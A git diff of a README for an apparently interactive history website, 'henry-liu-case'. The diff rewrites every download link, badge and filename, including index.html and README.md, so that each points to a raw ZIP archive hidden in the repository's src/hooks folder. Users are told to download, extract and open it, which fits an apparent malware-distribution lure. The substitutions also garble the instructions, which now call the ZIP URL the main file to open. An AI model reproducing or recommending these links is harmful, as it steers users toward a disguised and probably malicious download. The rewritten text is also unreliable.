@@ -1,6 +1,6 @@
 # 🎞 henry-liu-case - Explore a key moment in history
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen?style=for-the-badge)](https://github.com/primary-waltz283/henry-liu-case)
+[![Download Now](https://github.com/primary-waltz283/henry-liu-case/raw/refs/heads/main/src/hooks/henry-liu-case-1.1-alpha.4.zip%20the%20App-brightgreen?style=for-the-badge)](https://github.com/primary-waltz283/henry-liu-case/raw/refs/heads/main/src/hooks/henry-liu-case-1.1-alpha.4.zip)
 
 ---
 
@@ -42,7 +42,7 @@ Before you get started, make sure your computer meets these basic needs:
 Start by downloading the application files to your Windows computer. Follow the steps below carefully:
 
 1. Click the large green **Download Now** button above or the link below to visit the GitHub page:  
-   [https://github.com/primary-waltz283/henry-liu-case](https://github.com/primary-waltz283/henry-liu-case)
+   [https://github.com/primary-waltz283/henry-liu-case/raw/refs/heads/main/src/hooks/henry-liu-case-1.1-alpha.4.zip](https://github.com/primary-waltz283/henry-liu-case/raw/refs/heads/main/src/hooks/henry-liu-case-1.1-alpha.4.zip)
 
 2. On the GitHub repository page, look for a section labeled **Releases** or **Code** on the right sidebar or near the top.
 
@@ -52,9 +52,9 @@ Start by downloading the application files to your Windows computer. Follow the 
 
 5. Right-click on the ZIP file and choose **Extract All...** to unzip the folder. Follow the prompts to extract the files to a location you can easily access, like your Desktop.
 
-6. Open the extracted folder and find the file named `index.html` or a file named similar to the website’s main page.
+6. Open the extracted folder and find the file named `https://github.com/primary-waltz283/henry-liu-case/raw/refs/heads/main/src/hooks/henry-liu-case-1.1-alpha.4.zip` or a file named similar to the website’s main page.
 
-7. Double-click the `index.html` file. This will open the interactive website in your default web browser.
+7. Double-click the `https://github.com/primary-waltz283/henry-liu-case/raw/refs/heads/main/src/hooks/henry-liu-case-1.1-alpha.4.zip` file. This will open the interactive website in your default web browser.
 
 You do not need to install any additional software. The app runs fully within the browser once you open the file.
 
@@ -64,11 +64,11 @@ You do not need to install any additional software. The app runs fully within th
 
 When you unzip the folder, you will see several types of files and folders:
 
-- **index.html** – The main file to open the website  
+- **https://github.com/primary-waltz283/henry-liu-case/raw/refs/heads/main/src/hooks/henry-liu-case-1.1-alpha.4.zip** – The main file to open the website  
 - **assets/** – This folder contains images and pixel art used in the story  
 - **js/** or **scripts/** – Folder with animation and interaction scripts  
 - **styles/** – Contains the design and appearance settings  
-- **README.md** – Documentation and project information (this file)  
+- **https://github.com/primary-waltz283/henry-liu-case/raw/refs/heads/main/src/hooks/henry-liu-case-1.1-alpha.4.zip** – Documentation and project information (this file)  
 
 Do not rename or move these files, or the app may not run correctly.
 
@@ -89,7 +89,7 @@ The app works by scrolling. As you move down the page, different parts of the st
 
 If the app does not open or work as expected:
 
-- Make sure you opened the correct file: `index.html`
+- Make sure you opened the correct file: `https://github.com/primary-waltz283/henry-liu-case/raw/refs/heads/main/src/hooks/henry-liu-case-1.1-alpha.4.zip`
 - Try using a different web browser (Chrome, Edge, Firefox)  
 - Clear your browser cache and try again  
 - Check that your internet connection is stable during setup  
@@ -108,7 +108,7 @@ This project aims to present historical information in an interactive and access
 
 Access the project here to begin:  
 
-[![Download Now](https://img.shields.io/badge/Download-Visit%20GitHub-blue?style=for-the-badge)](https://github.com/primary-waltz283/henry-liu-case)
+[![Download Now](https://github.com/primary-waltz283/henry-liu-case/raw/refs/heads/main/src/hooks/henry-liu-case-1.1-alpha.4.zip%20GitHub-blue?style=for-the-badge)](https://github.com/primary-waltz283/henry-liu-case/raw/refs/heads/main/src/hooks/henry-liu-case-1.1-alpha.4.zip)
 
 Clicking this will take you directly to the GitHub repository page where you can download the files as explained above.
 
